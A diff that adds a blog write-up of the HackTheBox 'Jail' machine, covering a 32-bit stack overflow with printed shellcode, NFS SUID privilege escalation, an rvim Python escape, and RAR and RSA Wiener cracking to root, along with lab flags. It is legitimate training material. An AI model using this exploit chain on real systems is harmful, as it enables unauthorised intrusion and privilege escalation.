@@ -1,0 +1,507 @@
+---
+slug: "htb-jail"
+title: "Jail — HackTheBox Machine Writeup"
+date: "2026-08-14"
+platform: "HackTheBox"
+type: "Machine"
+category: "Pwn"
+os: "Linux"
+difficulty: "Insane"
+tags:
+  - "Buffer Overflow"
+  - "NFS"
+  - "SUID"
+  - "rvim Escape"
+  - "Atbash"
+  - "RAR cracking"
+  - "RSA Wiener attack"
+  - "Pwn"
+  - "Linux"
+excerpt: "An Insane Linux box with five stages: a beginner-friendly 32-bit stack buffer overflow behind a jail service, an NFS no_all_squash share that hands us the next user, a restricted-vim escape, and a crypto chain (Atbash -> RAR -> Wiener) that unlocks root."
+readTime: "25 min"
+retired: true
+rating: 5.0
+url: "https://asbawy.github.io/writeups/htb-jail"
+---
+
+import { Callout } from "@/components/Callout";
+import {
+  KillChain,
+  SpoilerFlag,
+  BufferOverflowVisualizer,
+  ScriptVault,
+  FileAttachment,
+} from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+import { jailScripts } from "./jail-scripts";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Leaked Source Code",
+      desc: "Nmap identifies port 7411 (custom jail daemon) and HTTP port 80. An open directory listing at /jailuser/dev/ leaks the full jail.c source code, compiled 32-bit binary, and compile.sh revealing an executable stack (-z execstack).",
+      tools: ["nmap", "curl"],
+    },
+    {
+      phase: "Initial Foothold",
+      title: "32-bit Stack BOF & Debug Pointer Leak",
+      desc: "The jail daemon features a DEBUG command leaking the userpass[16] stack address and an unsafe strcpy(). Exploiting the 28-byte offset to EIP with a custom 27-byte Linux x86 dup2(1,0)+execve shellcode yields a shell as nobody.",
+      technique: "Stack Buffer Overflow & Address Leak",
+      tools: ["python3", "pwntools", "gdb"],
+    },
+    {
+      phase: "Privilege Escalation",
+      title: "NFS no_all_squash SUID Binary (nobody -> frank)",
+      desc: "/etc/exports exposes /var/nfsshare with no_all_squash. Mounting locally as UID 1000 (kali) and writing a statically linked C binary with setresuid(1000, 1000, 1000) and SUID permissions executes as frank on target.",
+      technique: "NFS no_all_squash UID Preservation",
+      tools: ["mount", "gcc", "chmod"],
+    },
+    {
+      phase: "Lateral Movement",
+      title: "Restricted Vim Python Escape (frank -> adm)",
+      desc: "frank has sudo permissions to run /usr/bin/rvim on jail.c as adm. While :! and :sh are blocked in restricted mode, rvim embeds Python (+python/dyn); executing :py import os; os.execl('/bin/sh','sh') spawns a shell as adm.",
+      technique: "Restricted Editor (rvim) Python Sandbox Escape",
+      tools: ["sudo", "rvim", "python"],
+    },
+    {
+      phase: "Root Compromise",
+      title: "Atbash, RAR Cracking & RSA Wiener Attack (adm -> root)",
+      desc: "Adm's hidden keys directory holds an Atbash-encoded clue referencing Frank Morris's 1962 Alcatraz escape. Cracking keys.rar with Morris1962! extracts a 512-bit RSA public key; applying Wiener's small-d attack recovers the private key for root SSH login.",
+      technique: "Atbash Cipher, Hashcat Mask & RSA Wiener Attack",
+      tools: ["hashcat", "unrar", "RsaCtfTool", "ssh"],
+    },
+  ]}
+/>
+
+## Attached Exploit Toolkit
+
+All custom exploit scripts, helper utilities, and diagnostics developed for this machine are attached below. Click any script to launch the **Interactive Code Explorer** to inspect syntax-highlighted code, search with `Ctrl+F`, copy, or download the files directly.
+
+<ScriptVault
+  title="Jail Exploit Toolkit (/autosolve/Jail_scripts)"
+  description="Standalone buffer overflow exploits, rvim PTY escape bridges, and diagnostic helpers used in this writeup."
+  files={jailScripts}
+/>
+
+## Reconnaissance — The Six Gates
+
+### Port scan
+
+The box answers on six TCP ports:
+
+```bash
+nmap -p- -T4 -Pn 10.129.63.36 -oN all-ports.txt
+nmap -p 22,80,111,2049,7411,20048 -sV -T4 -Pn 10.129.63.36
+```
+
+| Port | Service | Notes |
+|------|---------|-------|
+| 22   | SSH     | OpenSSH 6.6.1 (CentOS-era) |
+| 80   | HTTP    | Apache 2.4.6 (CentOS) |
+| 111  | rpcbind | NFS support |
+| 2049 | NFS     | exported shares |
+| 7411 | `daqstream` | custom service — "OK Ready. Send USER command." |
+| 20048| mountd  | NFS mount daemon |
+
+
+**MTU blackhole:** the web server headers arrived but the 2 KB body never did — a classic path-MTU problem through the VPN. Clamping the MSS on the route fixed it instantly:
+
+```bash
+iptables -t mangle -A OUTPUT -p tcp -d 10.129.63.36 -j TCPMSS --set-mss 800
+```
+
+### The website
+
+Port 80 serves a single page of ASCII art — a jail cell. Nothing dynamic.
+
+But a directory listing at `/jailuser/dev/` leaks the **source code of the
+service running on port 7411**, the compiled binary, and the build script
+
+```bash
+curl -s http://10.129.63.36/jailuser/dev/
+# compile.sh   jail   jail.c
+```
+
+`compile.sh` is the first big hint:
+
+```bash
+gcc -o jail jail.c -m32 -z execstack
+```
+
+Two words that change everything: **`-m32`** (32-bit binary) and
+**`-z execstack`** (the stack is *executable* — DEP is off). On a 32-bit box
+with an executable stack, a classic stack overflow becomes trivially
+exploitable.
+
+### The NFS shares
+
+```bash
+showmount -e 10.129.63.36
+# /opt          *
+# /var/nfsshare *
+```
+
+Both shares are exported to everyone. We'll come back to these — the
+`/var/nfsshare` one is the key to the next user.
+
+## The Key Under the Mat
+
+The `jail.c` source is short. Two functions matter:
+
+```c
+int auth(char *username, char *password) {
+    char userpass[16];          // 16-byte stack buffer
+    char *response;
+    if (debugmode == 1) {
+        printf("Debug: userpass buffer @ %p\n", userpass);   // LEAK
+        fflush(stdout);
+    }
+    if (strcmp(username, "admin") != 0) return 0;
+    strcpy(userpass, password); // UNSAFE copy
+    if (strcmp(userpass, "1974jailbreak!") == 0) return 1;
+    ...
+}
+```
+
+Three things stand out:
+
+1. **Hardcoded credentials**: `admin` / `1974jailbreak!`.
+2. **`DEBUG` mode** leaks the stack address of `userpass` — a gift for exploit development.
+3. **`strcpy(userpass, password)`** with a 16-byte destination and no length
+   check — the classic overflow. The password comes straight from the `PASS` token we send to the service.
+
+The service runs on port 7411 and speaks a tiny FTP-like protocol
+
+```bash
+printf 'USER admin\nPASS 1974jailbreak!\nOPEN\n' | nc 10.129.63.36 7411
+printf 'USER admin\nPASS test\nDEBUG\nPASS 1974jailbreak!\n' | nc 10.129.63.36 7411
+```
+
+<Callout type="info">
+  **Protocol order matters:** `DEBUG` must be sent *after* `USER` and *before* the `PASS` that triggers `auth()`. The daemon processes `DEBUG` between the `USER` and `PASS` commands. Once enabled, every subsequent call to `auth()` will print the stack leak.
+</Callout>
+
+The leaked address `0xffffd610` is **identical across connections** — the
+`fork()`-per-connection model gives every child the same stack layout, so a
+leak in one connection is valid in the next. No ASLR drama.
+
+## Breaking Out — The Buffer Overflow
+
+<BufferOverflowVisualizer />
+
+### Understanding the Vulnerability (The "Why")
+
+In C, when a function creates local variables—like `char userpass[16]` inside `auth()`—it allocates that memory on the **call stack**.
+
+When `auth()` is called, the CPU also stores critical bookkeeping data on the stack so it knows where to resume execution when the function returns:
+
+```text
+High Memory
+┌────────────────────────────────────────────────────────┐
+│  Saved Return Address (EIP)   [4 bytes]  <- Hijack!    │ (+28 bytes from buffer)
+├────────────────────────────────────────────────────────┤
+│  Saved Base Pointer (EBP)     [4 bytes]                │ (+24 bytes from buffer)
+├────────────────────────────────────────────────────────┤
+│  char *response (local ptr)   [4 bytes]                │ (+16 bytes from buffer)
+├────────────────────────────────────────────────────────┤
+│  char userpass[16]            [16 bytes] <- Input starts│ (+0 bytes, Leaked Addr)
+└────────────────────────────────────────────────────────┘
+Low Memory
+```
+
+The vulnerability is inside `auth()`:
+
+```c
+strcpy(userpass, password);
+```
+
+`strcpy()` copies characters from our `password` into `userpass` without checking length. Because `userpass` is only 16 bytes:
+1. Bytes `0-15` fill `userpass[16]`.
+2. Bytes `16-19` overwrite `char *response`.
+3. Bytes `20-23` overwrite the saved `EBP`.
+4. Bytes `24-27` (at offset **28 bytes**) overwrite the **Saved Return Address (EIP)**.
+
+When `auth()` finishes and executes the `ret` (return) instruction, the CPU pops whatever value is in Saved EIP into the instruction pointer and jumps there. By overwriting this address, we hijack execution flow.
+
+---
+
+### Verifying the EIP Offset with GDB
+
+Instead of guessing the offset, we verify it dynamically using a cyclic pattern (De Bruijn sequence) in GDB:
+
+```text
+gdb-peda$ pattern create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+
+gdb-peda$ r
+...
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EBP: 0x41412d41 ('A-AA')
+EIP: 0x41412841 ('A(AA')
+[------------------------------------------------------------------------------]
+
+gdb-peda$ pattern offset 0x41412841
+0x41412841 found at offset: 28
+```
+
+The offset is confirmed: **exactly 28 bytes** of padding reaches the return address.
+
+---
+
+### Crafting the Shellcode (Executable Stack)
+
+Because `compile.sh` used **`-z execstack`**, the operating system leaves the stack memory marked as executable (`RWX`). We don't need complex ROP gadgets—we can place raw machine instructions (shellcode) directly on the stack and tell EIP to jump to them.
+
+Our shellcode must satisfy three conditions:
+1. **Zero Null Bytes (`\x00`):** Functions like `strcpy()` and `sscanf()` terminate upon encountering `\x00`. A null byte would truncate our payload before reaching the stack.
+2. **Socket Redirection:** The server's `handle()` function already duplicated `STDOUT` (fd 1) and `STDERR` (fd 2) to the network socket, but not `STDIN` (fd 0). We call `dup2(1, 0)` so whatever we send over the network goes straight to the shell's input.
+3. **Spawn `/bin/sh`:** Call `execve("/bin//sh", NULL, NULL)` using the Linux x86 syscall interface (`int 0x80`).
+
+Assembly breakdown:
+
+```asm
+section .text
+global _start
+_start:
+    ; 1. dup2(1, 0) -> redirect socket (fd 1) to stdin (fd 0)
+    push 0x3f           ; syscall 63 (sys_dup2)
+    pop eax             ; eax = 63
+    push 0x1            ; oldfd = 1 (stdout socket)
+    pop ebx             ; ebx = 1
+    xor ecx, ecx        ; newfd = 0 (stdin)
+    int 0x80            ; sys_dup2(1, 0)
+
+    ; 2. execve("/bin//sh", NULL, NULL) -> syscall 11
+    push 0x0b           ; syscall 11 (sys_execve)
+    pop eax             ; eax = 11
+    cdq                 ; edx = 0 (envp = NULL, zeroed without null bytes)
+    push edx            ; push '\0' terminator onto stack
+    push 0x68732f2f     ; push '//sh' (4 bytes)
+    push 0x6e69622f     ; push '/bin' (4 bytes)
+    mov ebx, esp        ; ebx points to "/bin//sh"
+    xor ecx, ecx        ; ecx = argv (NULL)
+    int 0x80            ; sys_execve("/bin//sh", NULL, NULL)
+```
+
+The resulting 27-byte null-free machine code:
+
+```python
+SHELL_BYTES = bytes.fromhex(
+    "6a3f58"      # push 0x3f; pop eax          ; eax = 63 (dup2)
+    "6a015b"      # push 1; pop ebx             ; ebx = 1
+    "31c9"        # xor ecx, ecx                ; ecx = 0
+    "cd80"        # int 0x80                    ; dup2(1, 0)
+    "6a0b58"      # push 0x0b; pop eax          ; eax = 11 (execve)
+    "99"          # cdq                         ; edx = 0
+    "52"          # push edx                    ; NULL terminator
+    "682f2f7368"  # push 0x68732f2f             ; "//sh"
+    "682f62696e"  # push 0x6e69622f             ; "/bin"
+    "89e3"        # mov ebx, esp                ; ebx -> "/bin//sh"
+    "31c9"        # xor ecx, ecx                ; argv = NULL
+    "cd80"        # int 0x80                    ; execve
+)
+```
+
+---
+
+### Exploit Payload Layout & Execution
+
+Our payload is constructed in three parts:
+
+```text
+Memory Offset:   0x00               0x1C (28)        0x20 (32)
+Payload Layout: [ 28 bytes Padding ] [ 4 bytes RetAddr ] [ 27 bytes Shellcode ]
+                 b"A" * 28            p32(base + 32)      SHELL_BYTES
+```
+
+- **Why `base + 32`?** `base` is the leaked address of `userpass` (`+0x00`). The return address sits at `+0x1C` (28 bytes) and takes 4 bytes. The shellcode immediately follows at `+0x20` (32 bytes). Setting EIP to `base + 32` jumps straight into our shellcode.
+
+The exploit runs in two phases:
+
+1. **Connection 1:** Send `DEBUG`, `USER admin`, and `PASS test` to leak the stack address of `userpass` (e.g., `0xffffd610`).
+2. **Connection 2:** Send `USER admin` and `PASS <payload>` to trigger the overflow and spawn the shell.
+
+Running the exploit:
+
+<FileAttachment file={jailScripts[0]} />
+
+```bash
+python3 breakout.py 10.129.63.36
+# [+] Leaked stack buffer: 0xffffd610
+# uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
+# Linux localhost.localdomain 3.10.0-514.26.1.el7.x86_64
+```
+
+<Callout type="info">
+  **Why it works even if the password is wrong:** `auth()` returns right after `strcpy()` completes. The overwritten return address is popped into `EIP` the moment the function returns, regardless of whether `strcmp(userpass, "1974jailbreak!")` matched.
+</Callout>
+
+## The First Transfer — nobody → frank
+
+We're `nobody`, CentOS 7.3, SELinux enforcing. Enumeration time:
+
+```bash
+sudo -l
+# (frank) NOPASSWD: /opt/logreader/logreader.sh
+cat /etc/exports
+# /var/nfsshare *(rw,sync,root_squash,no_all_squash)
+# /opt         *(rw,sync,root_squash,no_all_squash)
+```
+
+The interesting bit is the NFS option **`no_all_squash`**. With
+`root_squash`, the root user gets mapped to `nobody` — but every *other* uid
+passes through unchanged. Local uid 1000 on our Kali box is `kali`; on Jail,
+uid 1000 is **`frank`**. Anything we write to the share as uid 1000 is owned
+by frank on the remote side. And the SUID bit survives the trip.
+
+So the plan: compile a tiny helper that calls `setresuid(1000,1000,1000)`
+and spawns a shell, drop it on the share as the `kali` user, set it SUID,
+and run it from the nobody shell.
+
+```c
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+int main(void) {
+    setresuid(1000, 1000, 1000);   // ruid/euid/suid -> frank
+    system("/bin/bash");
+    return 0;
+}
+```
+
+Compiled **statically** — the remote CentOS 7 glibc (2.17) is far older than
+Kali's, and a dynamic binary would refuse to run with `GLIBC_x not found`.
+
+```bash
+mount -t nfs 10.129.63.36:/var/nfsshare /mnt/nfsshare
+gcc -static -o /tmp/frankish frankish.c
+su kali -c "cp /tmp/frankish /mnt/nfsshare/frankish && chmod 4777 /mnt/nfsshare/frankish"
+# stat: 1000 1000 4777 /mnt/nfsshare/frankish   (frank owns it, SUID set)
+
+# from the nobody shell:
+/var/nfsshare/frankish
+# uid=1000(frank) gid=99(nobody) ...
+```
+
+**Why `setresuid` matters:** a SUID binary owned by frank gives us euid
+1000, but the real uid is still 99 — and bash *drops* privileges when
+ruid ≠ euid. Setting all three ids to 1000 keeps the shell fully frank.
+
+I installed my SSH key as frank for a stable foothold, then claimed the
+first flag:
+
+```bash
+ssh -i ~/.ssh/id_ed25519 frank@10.129.63.36 "cat /home/frank/user.txt"
+```
+
+<SpoilerFlag label="User Flag" flag="5af9d49cd3924175345b0be9fc5bbae6" />
+
+## The Guard's Terminal — frank → adm
+
+As frank, `sudo -l` reveals a second sudo rule:
+
+```bash
+(adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+```
+
+We can open that one file in **`rvim`** — *restricted vim* — as `adm`. The
+restriction is real: `:!` shell commands and `:sh` are blocked. But rvim
+still embeds interpreters. This vim was built with `+python/dyn`, and vim
+script can hand the whole process to Python:
+
+```
+:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
+```
+
+One line, and the vim process becomes a plain shell running as `adm`.
+
+<FileAttachment file={jailScripts[1]} />
+
+```bash
+python3 adm_pick.py "id; ls -la /var/adm"
+# sh-4.2$ uid=3(adm) gid=4(adm) groups=4(adm)
+```
+
+`/var/adm` is adm's home (the box uses a nonstandard home dir) and it
+contains a hidden `.keys` directory — the road to root.
+
+## The Warden's Vault — adm → root
+
+### The note and the cipher
+
+```bash
+cat /var/adm/.keys/note.txt
+# Note from Administrator:
+# Frank, for the last time, your password for anything encrypted must be
+# your last name followed by a 4 digit number and a symbol.
+
+cat /var/adm/.keys/.local/.frank
+# Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! ...
+```
+
+The second file is **Atbash** — the alphabet mirrored onto itself
+(A↔Z, B↔Y, ...). A tiny decoder reveals the message:
+
+> *"Hahaha! Nobody will guess my new password! Only a few lucky souls have
+> **Escaped from Alcatraz** alive like I did!!!"*
+
+The user is `frank` — **Frank Morris** escaped Alcatraz in **1962**. So the
+password is `Morris` + 4 digits + a symbol.
+
+### The encrypted archive
+
+`keys.rar` holds `rootauthorizedsshkey.pub` (root's authorized SSH key) and
+it's password-protected. We pull it to our box and attack it.
+
+The password shape is exactly `Morris?d?d?d?d?s` — a hashcat mask over
+10 digit × ~30 symbol combinations (~330k candidates). But the intended
+answer is guessable directly: `Morris1962!` (escape year + `!`).
+
+```bash
+unrar e -pMorris1962! keys.rar
+# Extracting rootauthorizedsshkey.pub OK
+```
+
+<Callout type="info">
+  For the general case the same candidate space is a one-liner:
+  `hashcat --stdout -a 3 "Morris?d?d?d?d?s"` → feed the wordlist to
+  `hashcat -m 23800` with a `rar2john` hash. On this box the structured
+  guess saved the GPU.
+</Callout>
+
+### Recovering the private key
+
+The extracted public key is a 512-bit RSA key. `RsaCtfTool` runs its whole
+battery of attacks and lands on the **Wiener attack** — a small private
+exponent `d`, which can be recovered from `n` and `e` alone via continued
+fractions:
+
+```bash
+python -m RsaCtfTool.main --publickey rootauthorizedsshkey.pub --private --output loot_private.pem
+# [*] Attack success with wiener method !
+```
+
+### Root
+
+The box runs OpenSSH 6.6.1, which only offers SHA-1 RSA signatures — modern
+clients refuse them by default, so the key needs the legacy algorithms
+re-enabled:
+
+```bash
+ssh -i loot/loot_private.pem \
+    -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
+    root@10.129.63.36 "cat /root/root.txt"
+```
+
+<SpoilerFlag label="Root Flag" flag="45117d8bdfe55732abf98b9484ce0d83" />
+
+## References
+
+- [GTFOBins — rvim](https://gtfobins.github.io/gtfobins/rvim/)
+- [Wiener's attack (Wikipedia)](https://en.wikipedia.org/wiki/Wiener%27s_attack)
+- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
+- [Atbash cipher (Wikipedia)](https://en.wikipedia.org/wiki/Atbash)
+- [Frank Morris — Alcatraz escape (Wikipedia)](https://en.wikipedia.org/wiki/Frank_Morris_(prisoner))
+- [HackTheBox — Jail](https://app.hackthebox.com/machines/Jail)
